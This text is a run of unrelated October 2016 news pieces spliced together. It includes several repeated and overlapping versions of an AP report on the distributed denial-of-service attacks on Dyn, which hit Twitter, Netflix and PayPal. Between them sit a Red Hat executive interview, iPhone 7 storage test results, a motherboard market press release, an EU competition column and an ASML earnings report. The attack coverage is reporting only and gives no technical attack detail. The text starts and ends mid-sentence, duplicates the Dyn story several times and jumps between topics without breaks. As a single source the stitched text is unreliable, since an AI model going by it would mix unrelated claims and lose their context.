Internet,” respected security expert Bruce Schneier said last month that major internet infrastructure companies were seeing a series of worrying denial-of-service attacks. “Someone is extensively testing the core defensive capabilities of the companies that provide critical internet services,” he said. © 2016 CBS Interactive Inc.

The White House described the disruption as malicious. Members of a hacker group spread across China and Russia claimed responsibility, although their assertion couldn't be verified. Manchester-based Dyn Inc. said its server infrastructure was hit by distributed denial-of-service attacks, which work by overwhelming targeted machines with junk data traffic. The attack had knock-on effects for users trying to access popular websites from across America and even in Europe, affecting sites such as Twitter, Netflix and PayPal. Broad effects The level of disruption was difficult to gauge, but Dyn provides internet traffic management and optimization services to some of the biggest names on the web, including Twitter, Netflix and Visa. Critically, Dyn provides domain name services, which translate the human-readable addresses such as "twitter.com" into an online route for browsers and applications. Steve Grobman, chief technology officer at Intel Security, compared an outage at a domain name services company to tearing up a map or turning off GPS before driving to the department store. "It doesn't matter that the store is fully open or operational if you have no idea how to get there," he said in a telephone interview. Jason Read, founder of the internet performance monitoring firm CloudHarmony, owned by Gartner Inc., said his company tracked a half-hour-long disruption early Friday in which roughly one in two end users would have found it impossible to access various websites from the East Coast. A second attack later in the day caused disruption to the East and West Coasts as well as impacting some users in Europe. "It's been pretty busy for those guys," Read said. "We've been monitoring Dyn for years and this is by far the worst outage event that we've observed." Read said Dyn provides services to some 6 percent of America's Fortune 500 companies. "It impacted quite a few users," he said of the morning's attack. A full list of affected companies wasn't immediately available, but Twitter, Netflix, PayPal and the coder hangout Github said they briefly experienced problems earlier Friday. Hackers responsible Members of a shadowy hacker collective that calls itself New World Hackers claimed responsibility for the attack via Twitter. They said they organized networks of connected "zombie" computers that threw a staggering 1.2 terabits per second of data at the Dyn-managed servers. "We didn't do this to attract federal agents, only test power," two collective members who identified themselves as "Prophet" and "Zain" told an AP reporter via Twitter direct message exchange. They said more than 10 members participated in the attack. It was not immediately possible to verify the claim. Dyn officials said they did not know who was behind the attacks or if they were orchestrated by a state-backed group or online activists or pranksters. They said they have received no claim of responsibility, but are working with law enforcement. The collective, @NewWorldHacking on Twitter, has in the past claimed responsibility for similar attacks against sites including ESPNFantasySports.com in September and the BBC on Dec. 31. The attack on the BBC marshalled half the computing power of Friday's onslaught. The collective has also claimed responsibility for cyberattacks against Islamic State. The two said about 30 people have access to the @NewWorkd Hacking Twitter account. They said 20 are in Russia and 10 in China. "Prophet" said he is in India. "Zain" said he is in China. The two claimed to be taking "good actions." Another collective member the AP previously communicated with via direct message called himself "Ownz" and identified himself as a 19-year-old in London. He told the AP that the group - or at least he - sought through hacking only to expose security vulnerabilities. During the attack on the ESPN site, "Ownz" was asked if the collective made any demands on sites it attacked, such as demanding blackmail money. "We will make one demand actually. Secure your website and get better servers, otherwise be attacked again," he said. The vulnerable internet For James Norton, the former deputy secretary at the Department of Homeland Security who now teaches on cybersecurity policy at Johns Hopkins University, the incident was an example of how attacks on key junctures in the network can yield massive disruption. "I think you can see how fragile the internet network actually is," he said. Dyn said in a series of statements that it first became aware of the attack around 7 a.m. local time and that services were restored about two hours later. A little more than two hours later, the company said it was working to mitigate another attack. A Dyn spokesman didn't respond to questions seeking further information about the online onslaught. The U.S. Department of Homeland Security is monitoring the situation, White House spokesman Josh Earnest told reporters Friday. He said he had no information about who may be behind the disruption. Security experts have recently expressed concern over increasing power of denial-of-service attacks following high-profile electronic assaults against investigative journalist Brian Krebs and French internet service provider OVH. In a widely shared essay titled "Someone Is Learning How to Take Down the Internet," respected security expert Bruce Schneier said last month that major internet infrastructure companies were seeing a series of worrying denial-of-service attacks. "Someone is extensively testing the core defensive capabilities of the companies that provide critical internet services," he said. Top Jobs Contemporary Chrysler • Jeep • Dodge Ram is hiring!!

The task facing organisations today is to negotiate an optimal path through a complex and fast-changing technological landscape, avoiding blind alleys such as -- to take just one example -- 'lock in' to a particular public cloud provider. The technology stack offered by open-source pioneer Red Hat is at the heart of many enterprise digital transformation projects, and we caught up with Tim Yeaton, senior vice-president of the company's infrastructure business, at the Red Hat Forum in London earlier this month to discuss this and other matters. We began by asking how far the average CIO has travelled down the digital transformation road. tim-yeaton-red-hat.jpgMore "Most companies know they need to -- or believe they should -- go there," said Yeaton, "but most traditional IT organisations are struggling with how to get their current environments to be far more cost-effective to even think about scraping off enough investment to go pursue cloud-native applications." "I have more CIO-level conversations about their strategic direction than I've ever had before -- maybe three a week," he continued. "What's really fascinating is, I'll talk to a CIO in a particular industry -- the financial services sector, for example -- and they'll say 'we're worried that all our competitors are miles ahead of us', and the first thing I say is 'don't believe the hype -- the reality is, there's one or two in the industry that went all-in first, but most companies are in the same situation'. CIOs are almost embarrassed to think they're the only ones behind, but this is a long evolution that's going to play out." As far as the drivers of digital transformation are concerned, are these different for different industries? "I think the destination ultimately is the same -- highly fluid, scalable infrastructure -- but the journeys are definitely different," said Yeaton. "For example, the telecommunications industry, as it moves to software-defined, is completely reinventing itself. Relationships between network equipment providers and the carriers and service providers are all changing: some of the carriers don't think they need their traditional suppliers, so they'll do it themselves or work with vendors like us. That's an industry where it's been thrown completely up in the air. In other industries it's far more linear -- financial services, for example, where they're always looking for the next wave of innovation, so they've jumped on this. Then there are industries where some digital entrant has created an existential threat -- retail, for example, where a high percentage is now online. And in some cases it's just improving competitiveness -- like in oil and gas, or some of the manufacturing sectors." rh-digital-transformation.jpgMore Read More Red Hat's business model: Curating upstream innovation If you've ever wondered how a business can make money from free open-source software, just take a look at Red Hat's business model and recent financial results. In a nutshell, Red Hat tracks the multitude of open-source projects out there, selects and curates a (small) proportion of them, and delivers 'mission-critical IT solutions' with essential additions such as quality assurance, user experience, lifecycle management and enterprise-grade support. It's a model that currently delivers over $2 billion in revenue a year (guidance for FY2017, ending next February, is around $2.4bn). "In the early days, the open-source motivation was to create low-cost replicas of commercial software -- operating systems, middleware -- and it actually did a pretty good job," said Yeaton. "But I think both the licensing models and the pace of innovation in those collaborative communities caught on, so it was a self-feeding process. Now, the fount of most innovation in software is coming out of these 'upstream' open-source communities. But they're communities of innovation, not communities of completion: what they don't do well -- and this hasn't changed, and I don't think will ever change -- is, they're not focused on 'fit and finish'...they're not trying to build complete, perfect products." Which, of course, is where Red Hat comes in. rh-approach.jpgMore "What's different now is that the range of technologies that's being innovated in the upstream is so broad that you have to have direct and active participation in every single project that you're going to productise," said Yeaton. "The reason is, you're going to have to make improvements in installation, you're going to have to make improvements in user experience and user interface, integration -- and then there's all the hard work around providing lifecycle." "Support really comes from, how do we fix bugs in current releases, how do we fix bugs that appear, as well as introduce new features? We do that via something called 'backporting'. The way we give a three-year lifecycle to OpenStack, for example, even though OpenStack's release cadence is every six months, is: let's say we release the 'M' version of OpenStack, which we've recently done; we're going to support that in production for three years, so we have developers on every single OpenStack module that understand the technology deeply and can make judgements around a bug that's found, say, two or three releases hence...how that might be backported to the original, or interesting new features that are required to sustain something in production. There have been a number of new entrants in open-source who haven't quite gotten this model." "We have the discipline to say: 'we'll only modify existing projects in special ways because we know those changes will be accepted upstream' -- everything we do is in the upstream, there's no proprietary bits that we maintain on our own. By keeping the model pure, we're able to avoid putting customers in jeopardy of being on a fork." So, even given Red Hat's strategic focus on IT infrastructure and application development, all this curation presumably limits the number of upstream projects that the company can be involved in? "Without a doubt," Yeaton confirmed. "Of the million or so open-source projects that exist in the world, we participate in under two thousand -- and what's interesting is, we participate in more than we productise. So for example, in projects that are setting an industry direction like OpenDaylight in software-defined networking, we work almost exclusively with our software-defined networking partners -- but it gives us enough insight to know how to integrate it effectively and performantly into OpenStack." And how do the upstream communities view Red Hat? How often do they get paid for the work that ultimately fills the company's coffers? "As far as the infrastructure products that I'm responsible for are concerned, we probably author 25 percent of the code that we ship, yet if you look at the upstream communities, most developers are paid by someone. OpenStack is a great example: here, today [at the London Red Hat Forum] we have RackSpace, who are very strong contributors, along with Intel and other software providers -- even people we compete with." As noted earlier, Red Hat's model certainly delivers the goods. The company's most recent quarterly results (Q2 FY2017) included $600 million in revenue (19% year-on-year growth), of which the majority -- $531m or 88.5 percent -- was recurring subscription revenue. Red Hat has now delivered 57 consecutive quarters of revenue growth, which goes a long way towards explaining the company's healthy share price trajectory in recent years: red-hat-share-price.jpgMore Concepts, buzzwords and guidance For CIOs, keeping up with trends in enterprise IT is a never-ending process of absorbing new concepts and buzzwords, working out their potential relevance to their particular organisations, and then implementing them as required. So, 'waterfall' development cadences have become 'agile' and are heading towards a continuous 'DevOps' model; traditional 'monolithic' apps have become 'N-Tier', which will be superseded by 'microservices and open APIs'; and physical on-premise servers have given way to virtualised infrastructure, while 'containerised' apps running on public and private clouds are the way of the future. The broad goals here are to modernise legacy apps (to create cost savings), and develop new agile workloads (to implement innovative business initiatives). We asked Tim Yeaton how the latest buzzword, 'serverless architecture', or perhaps more accurately Function as a Service (FaaS) fits into Red Hat's enterprise IT picture. Amazon started this ball rolling in November 2014 with its Lambda service, and both Google (with Google Cloud Functions) and Microsoft (with Azure Functions) have now followed suit. So what's Red Hat's take on this? "I think it's just a point on the spectrum of virtualising and service-enabling," Yeaton said. "The funny thing about serverless environments is, it's a bit of a misnomer -- it's really about how much you can abstract away. We've thought a lot about that in our strategy, and you can see these concepts play out, but I think in practice it's going to take many years for them to become widely adopted." And how about Red Hat's customers -- are they often champing at the bit for new, trendy technologies like serverless/FaaS to be productised, or does the company have to explain to them why it's important? "The customers that we have the best relationships with often are the ones that come to us and say: 'this is kind of overwhelming...guide us a little bit'. They know they've got to react, but they're not entirely sure what to change first. In most companies, the hardest part is, you've got to get your development organisation to agile, and that typically means cultural shifts in the whole IT organisation -- policy and process changes -- before you start investing in the technology." tim-yeaton-red-hat-forum-crop.jpgMore Security and the new IT architecture Red Hat is in the business of creating mission-critical enterprise software, so clearly security is a central priority. But does the new generation of DevOps-created, microservices/open API-driven, containerised cloud-native workloads create qualitatively different security challenges for IT departments? "It's sort of a two-edged sword," said Yeaton. "You can make containers very secure -- containers are a Linux operating system technology, and we have techniques to secure those and wall them off -- so if you apply best practices for building containers, you can make containers very, very secure. The flip side is, there's a lot of pre-built containers in the wild -- you can get them from Docker Hub, lots of other places. And like any other code, if you're consuming code from the outside, what's in that container matters -- and containers are a binary format, so understanding what's in there is not easy. So here again, it's best practices: containers you're going to use in production you should probably build from source...you should know the provenance of that source. Sloppy microservices-based applications can introduce a lot of vulnerabilities, and you won't know them until it's too late." Does that mean, sometime in the future, that the 'dark side' of containers will manifest itself as security breaches of modern cloud-native apps? "I'm sure you'll see companies who ingest code they didn't understand having problems, no question," said Yeaton. "That's why it's as much about good development practices and policies -- having a root registry that you manage and you understand how components get put in there, all those kinds of things." Returning to the upstream open-source communities that are the wellspring of Red Hat's product line: does their focus on innovation mean that security is less of priority, resulting in the company having to put in a lot of work here? "Most security issues are ones where best practices were not applied during development, or something was introduced here that has an effect over there. We think of security as a component-level issue and a system-level issue, and we pay a lot of attention to both. We have teams inside the company that look across products as they get put together, which no upstream community is going to do." Technology choices and vendor lock-in Another potential trap for unwary CIOs is making technology choices that back them into a corner as far as public cloud providers, for example, are concerned. So how does Red Hat's open-source-based stack play here -- can it be seen as a future-proofing layer? "The way we've built our software elements, it's really designed to create abstractions across multiple public clouds. Let's say you're building a microservices application, and you don't want to necessarily be dependent on a single public cloud; you can build that in such a way that it can run on our infrastructure across public clouds or on-premises identically, using the same management tools and provisioning tools. That's unique to us, and that really comes from fifteen years of data centre experience and how to make those things first-class citizens in this new world." "Secondly, I've seen people talk about the 'Red Hat stack' as if it's a monolithic thing, but in our case each element of the stack, because they're community-first projects, has to add value in its own right. Now we do a lot of work to make sure that when you put them together you get the best experience possible, but we have customers all the time who use, say, OpenStack or OpenShift but someone else's management product, or they'll use somebody else's PaaS on top of our infrastructure. We're designed to be modular in that way -- we support, and only support, the native interfaces that are defined in the community, be it OpenStack, CloudForms, whatever. We're eminently pluggable." Does that mean, then, that Red Hat has nothing to fear from a widespread migration of enterprise workloads to the public cloud? "If it moves the way customers say it will, companies expect to be bimodal, with traditional and cloud-native apps in the mix; they're going to be hybrid, with on-prem and public cloud -- and on the public side they want to use multiple clouds because they're afraid of another generation of lock-in otherwise. There are companies who already have policies around what native services developers are allowed to use on any given public cloud -- they want to minimise that, so they can allow for portability, bursting and automated management. That's where this is all going." Outlook Wrapping up our time with Tim Yeaton, we asked for his vision of enterprise IT beyond the 3-5-year timeframe of the foregoing discussion. "In five to ten years, I think it's about how much can be abstracted, how much can be automated, how much can be driven through machine-to-machine and artificial intelligence, with developers adding value to what's come before. That's where you're going to see the pace accelerate." In this new world, the CIO will become much more of a curator and enabler of IT initiatives and developments -- a "broker of the resources," as Yeaton put it.

Posted Friday, October 21, 2016 4:58 pm By Raphael Satter and Frank Bajak The Associated Press LONDON >> Cyberattacks on a key internet firm repeatedly disrupted the availability of popular websites across the United States Friday, according to analysts and company officials. The White House described the disruption as malicious. Members of a hacker group spread across China and Russia claimed responsibility, although their assertion couldn't be verified. Manchester, New Hampshire-based Dyn Inc. said its server infrastructure was hit by distributed denial-of-service attacks, which work by overwhelming targeted machines with junk data traffic. The attack had knock-on effects for users trying to access popular websites from across America and even in Europe, affecting sites such as Twitter, Netflix and PayPal.

"I think you can see how fragile the internet network actually is," he said. Dyn officials said attacks stemmed from tens of millions of devices connected to the internet — closed-circuit video cameras, digital video recorders and even thermostats — that were infected with malware. Attacks came in waves and from IP addresses from around the world, shifting geographically. Dyn first became aware of an attack around 7:00 a.m. local time, focused on data centers on the East Coast of the U.S. Services were restored about two hours later. But then attackers shifted to offshore data centers, and the latest wave of problems continued until Friday evening Eastern time. "It is a very smart attack. As we start to mitigate they react and start to throw something that's over the top," Kyle York, chief strategy officer of Dyn, on a call with reporters. The U.S. Department of Homeland Security is monitoring the situation, White House spokesman Josh Earnest told reporters Friday. He said he had no information about who may be behind the disruption.

Some iPhones have slower write speeds by up to 200MB/s, while others suffer from very poor signal reception and data transfer rates. This year, Apple finally deprecated the entry-level 16GB iPhone model, which was something of an embarrassment in this day and age of 4K video recording and multi-gigabit apps. The move was welcomed by everyone, but the new 32GB model that replaced it doesn’t seem to be doing all that well. That’s because in various tests by different parties, the 32GB iPhone 7 consistently underperforms. When comparing read speeds between the 32GB model and the 128GB model, testers found that the entry-level devices only read data at 656MB/s, as opposed to the 856MB/s the big models get. What’s worse, is that in write speed tests, the 32GB model was over eight times slower than the larger 128GB counterpart. To be more exact, the 128GB iPhone 7 was found to write data at a speed of 341MB/s while the 32GB model only wrote at 42MB/s. This can potentially make a big difference in day to day use. The problem doesn’t even seem to be restricted to the basic iPhone 7 model, as the 32GB iPhone 7 Plus seems to suffer from the exact same problem. Moving on to cellular connectivity, this year’s iPhones contain modems from two different suppliers: Qualcomm and Intel. Unfortunately, according to testing done by Cellular Insights, the Intel devices, with model numbers A1778 and A1784, which are sold in Europe, performed significantly worse than the Qualcomm ones, model numbers A1660 and A1661. In tests, the iPhone 7 Plus models with the Intel modem performed between 30%-75% worse than the Qualcomm-powered iPhones. This affects connectivity, download speeds, dropped calls, battery usage and so on. Apple hasn’t publicly commented on these findings. All in all, it looks like you might need to spring for the more expensive iPhones, and carefully check their model numbers if you want to get the best performance out of them.

PRLog XHome Login Latest News News By Location News By Industry News By Tag News By Date Business Profiles Pressrooms Get Feeds Get Alerted Journalist Account PRNewswire Distribution Search Worldwide Motherboard Industry Growth Estimated at 5.9% in 3Q 2016   Spread the Word: News By Tag: * Worldwide Motherboard Industry By Industry: * TechnologyALBANY, N.Y. - Oct. 22, 2016 - PRLog -- Market Research Hub has announced the addition of a new report to its repository. The new report, titled as 'The Worldwide Motherboard Industry, 3Q 2016', offers analysis and projection on third quarter performance of the global motherboard sector. This report provides a detailed overview of the motherboard industry and complete analysis of the shipment volume for the period 1Q 2014 to the 2Q 2016. A motherboard is the heart of a computer system. It is the foremost printed circuit board present in the computers which holds the essential electronic components of the system like- the central processing unit (CPU) and memory unit (MU). It also provides the connectors for other important peripheral devices. In addition to the circuits, a motherboard of a computer system contains a large number of sockets and slots to connect the other components. Totally there are basically four types of major motherboards are existing into global market and it includes AT, XT, LTX (Low profile extension), Baby AT and ATX (Advanced Technology extended). Moreover, as due to the growth in the number of motherboards with Sky lake CPU, motherboard average selling price to some extent in the third quarter of 2016, leading to a sequential growth of 5.9% in 2016. Sky Lake is the latest generation of the Intel processors. The report also examines manufacturer rankings, CPU connector adoption, shipment destinations, assembly levels, production locations, and business types. The information provided by this report is based on primary data obtained from interviews with motherboard makers. The research report evaluates industry size and values along with recent quarter review of the worldwide motherboard industry. According to report findings, shipment value of the motherboard industry has declined 6.8% year-on-year to 32.3 million units in the fourth quarter of 2015. Earlier, it had declined 10.4% year-on-year to 28.97 million units in the first quarter of 2016. This decline is estimated to be on account of continued weak market demand and a higher baseline in the fourth quarter of 2015. Following that, overdue launch of-Sky lake CPUs contributed to a stronger performance last year in the same period. The industry did live up to expectations and suffered from year-on-year, this leads to sequential declines in the first quarter of year 2016. At some situations, it is anticipated that worldwide motherboard shipment volume will not see a pick-up till the second half of 2016. Key motherboard manufacturers profiled in the report include - Intel, Gigabyte Technology, ECS (Elitegroup Computer Systems), MS (Micro star International) AMD, Foxconn, Jetway, Microstar, Pegatron, QCI, T&I, Wistron etc. About Market Research Hub Market Research Hub (MRH) is a next-generation reseller of research reports and analysis.

AP News: HOME | US | WORLD | BUSINESS | FINANCE | TECHNOLOGY | SPORTS | ENTERTAINMENT | HEALTH | SCIENCE | WASHINGTON | STRANGE Search AP News: Oct 21, 8:19 PM EDT Cyberattacks on key internet firm disrupt internet services By RAPHAEL SATTER and FRANK BAJAK AP Technology Writers Withering cyberattacks on server farms of a key internet firm repeatedly disrupted access to major websites and online services including Twitter, Netflix and PayPal across the United States on Friday. The White House called the disruption malicious and a hacker group claimed responsibility, though its assertion couldn't be verified. Manchester, New Hampshire-based Dyn Inc. said its data centers were hit by three waves of distributed denial-of-service attacks, which overwhelm targeted machines with junk data traffic. The attacks, shifting geographically, had knock-on effects for users trying to access popular websites across the U.S. even in Europe. "The complexity of the attacks is what is making it so difficult for us," said Kyle York, the company's chief strategy officer. "What they are actually doing is moving around the world with each attack." He said an East Coast data center was hit first; attacks on an offshore target followed later. The data flood came from tens of millions of different Internet-connected machines - including increasingly popular but highly insecure household devices such as web-connected cameras. It was an onslaught whose global shifts suggested a sophisticated attacker, though Dyn said it had neither suspect nor motive. BROAD EFFECTS The level of disruption was difficult to gauge, but Dyn serves some of the biggest names on the web, providing the domain name services that translate the numerical internet addresses into human-readable destinations such as "twitter.com." Steve Grobman, chief technology officer at Intel Security, compared an outage at a domain name services company to tearing up a map or turning off GPS before driving to the department store. "It doesn't matter that the store is fully open or operational if you have no idea how to get there," he said in a telephone interview. Jason Read, founder of the internet performance monitoring firm CloudHarmony, owned by Gartner Inc., said his company tracked a half-hour-long disruption early Friday in which roughly one in two end users would have found it impossible to access various websites from the East Coast. "We've been monitoring Dyn for years and this is by far the worst outage event that we've observed," said Read. Dyn provides services to some 6 percent of America's Fortune 500 companies, he said. A full list of affected companies wasn't immediately available but Twitter, Netflix, PayPal and the coder hangout Github said they experienced problems. HACKERS CLAIM RESPONSIBILITY Members of a shadowy collective that calls itself New World Hackers claimed responsibility for the attack via Twitter. They said they organized networks of connected "zombie" computers called botnets that threw a staggering 1.2 terabits per second of data at the Dyn-managed servers. "We didn't do this to attract federal agents, only test power," two collective members who identified themselves as "Prophet" and "Zain" told an AP reporter via Twitter direct message exchange. They said more than 10 member participated in the attack. It was not immediately possible to verify the claim. Dyn officials said they have received no claim of responsibility, but are working with law enforcement. The collective, @NewWorldHacking on Twitter, has in the past claimed responsibility for similar attacks against sites including ESPN.com in September and the BBC on Dec. 31. The attack on the BBC marshaled half the computing power of Friday's onslaught. The collective has also claimed responsibility for cyberattacks against Islamic State. The two said about 30 people have access to the @NewWorkdHacking Twitter account. They claim 20 are in Russia and 10 in China. "Prophet" said he is in India. "Zain" said he is in China. The two claimed to their actions were "good," presumably because they highlighted internet security problems. Another collective member the AP previously communicated with via direct message called himself "Ownz" and identified himself as a 19-year-old in London. He told the AP that the group - or at least he - sought only to expose security vulnerabilities. During the attack on the ESPN site, "Ownz" was asked if the collective made any demands on sites it attacked, such as demanding blackmail money. "We will make one demand actually. Secure your website and get better servers, otherwise be attacked again," he said. THE VULNERABLE INTERNET For James Norton, the former deputy secretary at the Department of Homeland Security who now teaches on cybersecurity policy at Johns Hopkins University, the incident was an example of how attacks on key junctures in the network can yield massive disruption. "I think you can see how fragile the internet network actually is," he said. Dyn officials said attacks stemmed from tens of millions of devices connected to the internet - closed-circuit video cameras, digital video recorders and even thermostats - that were infected with malware. "The Internet of Things sort of ran way ahead of how the Internet was architected," Dyn's York said on a call with reporters. He said there are between 10-15 billion such devices online. Dyn first became aware of an attack around 7:00 a.m. local time, focused on data centers on the East Coast of the U.S. Services were restored about two hours later. But then attackers shifted to offshore data centers, and problems continue. "It is a very smart attack. As we start to mitigate they react and start to throw something that's over the top," York said on a call with reporters. The second attack broadened its net, affecting the U.S. West Coast. "Prophet" of New World Hackers said hacktivists of the broad, more amorphous Anonymous collective piled on in the third wave on Friday afternoon. "We've stopped all our attacks," he said at midafternoon. The U.S. Department of Homeland Security was monitoring the situation, White House spokesman Josh Earnest told reporters Friday. He said he had no information about who may be behind the disruption. Security experts have recently expressed concern over increasing power of denial-of-service attacks following high-profile electronic assaults against investigative journalist Brian Krebs and French internet service provider OVH . In a widely shared essay titled "Someone Is Learning How to Take Down the Internet," respected security expert Bruce Schneier said last month that major internet infrastructure companies were seeing a series of worrying denial-of-service attacks. "Someone is extensively testing the core defensive capabilities of the companies that provide critical internet services," he said. --- Satter reported from London, Bajak from Houston.

X Intel case could change flavour of €13bn Apple ruling European Court of Justice says Intel decision that led to €1.06bn fine should be re-examined Sat, Oct 22, 2016, 07:30 EU Competition Commissioner Margrethe Vestager: has she bitten off more than she can chew? Photograph: John Thys/AFP/Getty Images         Even as EU competition commissioner Margrethe Vestager was was putting a shot across the bows of a Government still reeling from the scale of the Apple tax ruling, a little heralded legal opinion in another part of the EU apparatus threatened this week to change things. In an interview with Irish Times European Correspondent Suzanne Lynch, Vestager insisted the ruling that Apple must repay up to €13 billion (plus possible interest) to the Irish Revenue – which might then face competing claims from other EU states for portions of this money – was fact-based. It has also emerged that the Irish authorities have submitted a list of 300 tax rulings to the commission as part of a broader enquiry in Brussels into tax rulings. Criticism Down the road in Luxembourg, European Court of Justice advocate general Nils Wahl was throwing a spanner into the works. He said a 2009 case against Intel, after an eight-year investigation – which led to a record €1.06 billion fine – should be re-examined in its entirety because a court erred in ruling against the company’s system of rebates for PC makers using its chips. The ECJ judges are not obliged to follow an advocate’s opinion but more often than not they do. Of particular interest to Apple and the Irish Government, which is planning ECJ appeals against Vestager’s record €13 billion ruling, is the advocate general’s criticism of the EU’s handling of evidence it gathered against Intel, saying the lower court was wrong to rule that regulators could add details of a meeting with a Dell executive long after the fact. Failure to communicate a shift in the focus of the Apple probe and keeping both the company and the Government in the dark unfairly during the investigation are central to the likely appeal against the Vestager ruling on Apple. ADVERTISEMENT In the wake of the AG’s opinion, lawyers in Brussels were suggesting, a confirmatory ruling by the full court could be among the most important decisions by an EU court in 25 years. It remains to be seen if the commissioner has bitten off more than she can chew.       Topics: Cantillon Margrethe Vestager Nils Wahl European Court of Justice Apple Intel AboutCantillon A man with a profound understanding of how money is made and lost, Kerry-born economist Richard Cantillon (1680s-1734) is a fitting namesake for this long-running column.

Dyn officials said they did not know who was behind the attacks or if they were orchestrated by a state-backed group or online activists or pranksters. They said they have received no claim of responsibility but are working with law enforcement. The collective, @NewWorldHacking on Twitter, has in the past claimed responsibility for similar attacks against sites including ESPNFantasySports.com in September and the BBC on Dec. 31. The attack on the BBC marshalled half the computing power of Friday’s onslaught. The collective has also claimed responsibility for cyberattacks against the Islamic State group. The two said about 30 people have access to the @NewWorkdHacking Twitter account. They said 20 are in Russia and 10 in China. “Prophet” said he is in India. “Zain” said he is in China. The two claimed to be taking “good actions.” Another collective member the AP previously communicated with via direct message called himself “Ownz” and identified himself as a 19-year-old in London. He told the AP that the group — or at least he — sought through hacking only to expose security vulnerabilities. During the attack on the ESPN site, “Ownz” was asked if the collective made any demands on sites it attacked, such as demanding blackmail money. “We will make one demand actually: Secure your website and get better servers, otherwise be attacked again,” he said. Fragile internet For James Norton, a former deputy secretary at the Department of Homeland Security who now teaches on cybersecurity policy at Johns Hopkins University, the incident was an example of how attacks on key junctures in the network can yield massive disruption. “I think you can see how fragile the internet network actually is,” he said. Dyn officials said attacks stemmed from tens of millions of devices connected to the internet — closed-circuit video cameras, digital video recorders and even thermostats — that were infected with malware. Attacks came in waves and from IP addresses from around the world, shifting geographically. Dyn first became aware of an attack around 7:00 a.m. local time, focused on data centers on the East Coast of the U.S. Services were restored about two hours later. But then attackers shifted to offshore data centers, and the latest wave of problems continued until Friday evening Eastern time. “It is a very smart attack. As we start to mitigate they react and start to throw something that’s over the top,” Kyle York, chief strategy officer of Dyn, on a call with reporters. Homeland Security is monitoring the situation, White House spokesman Josh Earnest told reporters Friday. He said he had no information about who may be behind the disruption.

The stock rose the most since March. The gross margin, or what’s left of sales after production costs, will be as high as 48 percent in the fourth quarter, the Veldhoven, Netherlands-based company said in a statement Wednesday. That prediction compares with the average estimate of 43.6 percent. The company reported third-quarter sales that beat estimates, mostly with older products, as it brings on its newest line based on so-called extreme ultraviolet lithography technology. ASML’s results and guidance “demonstrate a healthy mainstream business, while ASML continues to make progress on EUV,” Peter Olofsen, an analyst with Kepler Cheuvreux who rates the stock a buy, said in an e-mailed note. He expects ASML to confirm its 2020 targets when it meets investors on Oct. 31 in New York. ASML is pushing chipmaker clients such as Intel Corp., Samsung Electronics Co. and Taiwan Semiconductor Manufacturing Co. to upgrade to its newest machines, which can etch smaller circuits while increasing capacity and speed. The company said it took orders for three more of the extreme ultraviolet, or EUV, systems during the third quarter, and shipped one. Six customers, producing both memory and logic chips, have now ordered the systems. “A mix of sales to both logic and memory customers keeps us on track to finish the year with record annual sales," Chief Executive Officer Peter Wennink said in the statement. Revenue in the fourth quarter will be 1.7 billion euros ($1.87 billion) to 1.8 billion euros, ASML forecast. Analysts had predicted 1.76 billion euros on average. ASML rose as much as 4.3 percent in Amsterdam, the steepest intraday gain since March 10. Shares gained 3.75 percent, to 96.30 euros, as of 9:21 a.m. Third-quarter sales rose 17 percent to 1.82 billion euros, beating the average estimate of 1.73 billion euros. Net income rose 23 percent to 396 million euros, missing estimates after the company recognized partial revenue for a EUV system. That bolstered sales but also lowered the company’s gross margin by 1.4 percentage points in the quarter. The company is entering the fourth quarter with a "strong" order backlog of 3.5 billion euros, Chief Financial Officer Wolfgang Nickl said in a video posted on ASML’s website. The company sees a “bit of a bounce back” for memory shipments that were “weak” last quarter, he said. Before it's here, it's on the Bloomberg Terminal.

Withering cyberattacks on server farms of a key Internet firm repeatedly disrupted access to major websites and online services including Twitter, Netflix and PayPal across the United States on Friday. The White House called the disruption malicious, and a hacker group claimed responsibility, though its assertion couldn't be verified. Manchester, N.H.-based Dyn Inc. said its data centers were hit by three waves of distributed denial-of-service attacks, which overwhelm targeted machines with junk data traffic. The attacks, shifting geographically, had knock-on effects for users trying to access popular websites across the United States, even in Europe. “The complexity of the attacks is what is making it so difficult for us,” said Kyle York, the company's chief strategy officer. “What they are actually doing is moving around the world with each attack.” He said an East Coast data center was hit first; attacks on an offshore target followed later. The data flood came from tens of millions of Internet-connected machines — including increasingly popular but highly insecure household devices such as web-connected cameras. It was an onslaught whose global shifts suggested a sophisticated attacker, though Dyn said it had neither suspect nor motive. The level of disruption was difficult to gauge, but Dyn serves some of the biggest names on the web, providing the domain name services that translate the numerical Internet addresses into human-readable destinations such as “twitter.com.” Steve Grobman, chief technology officer at Intel Security, compared an outage at a domain name services company to tearing up a map or turning off GPS before driving to the department store. “It doesn't matter that the store is fully open or operational if you have no idea how to get there,” he said. Jason Read, founder of the internet performance monitoring firm CloudHarmony, owned by Gartner Inc., said his company tracked a half-hour-long disruption early Friday in which roughly one in two end users would have found it impossible to access various websites from the East Coast. “We've been monitoring Dyn for years, and this is by far the worst outage event that we've observed,” Read said. Dyn provides services to about 6 percent of America's Fortune 500 companies, he said. A full list of affected companies wasn't immediately available, but Twitter, Netflix, PayPal and the coder hangout Github said they experienced problems. Members of a shadowy collective that calls itself New World Hackers claimed responsibility for the attack via Twitter. They said they organized networks of connected “zombie” computers called botnets that threw a staggering 1.2 terabits per second of data at the Dyn-managed servers. “We didn't do this to attract federal agents, only test power,” two collective members who identified themselves as “Prophet” and “Zain” told an AP reporter via Twitter direct message exchange. They said more than 10 members participated in the attack. It was not immediately possible to verify the claim. Dyn officials said they have received no claim of responsibility, but are working with law enforcement. The collective, @NewWorldHacking on Twitter, has in the past claimed responsibility for similar attacks against sites including ESPN.com in September and the BBC on Dec. 31. The attack on the BBC marshaled half the computing power of Friday's onslaught. The collective has also claimed responsibility for cyberattacks against Islamic State. The two said about 30 people have access to the @NewWorldHacking Twitter account. They claim 20 are in Russia and 10 in China. “Prophet” said he is in India. “Zain” said he is in China. The two claimed their actions were “good,” presumably because they highlighted Internet security problems. Another collective member the AP previously communicated with via direct message called himself “Ownz” and identified himself as a 19-year-old in London. He told the AP that the group — or at least he — sought only to expose security vulnerabilities. During the attack on the ESPN site, “Ownz” was asked if the collective made any demands on sites it attacked, such as demanding blackmail money. “We will make one demand, actually,” he said. “Secure your website and get better servers. Otherwise, be attacked again.” For James Norton, the former deputy secretary at the Department of Homeland Security who now teaches on cybersecurity policy at Johns Hopkins University, the incident was an example of how attacks on key junctures in the network can yield massive disruption. “I think you can see how fragile the Internet network actually is,” he said. Dyn officials said attacks stemmed from tens of millions of devices connected to the Internet — closed-circuit video cameras, digital video recorders and even thermostats — that were infected with malware. “The Internet of Things sort of ran way ahead of how the 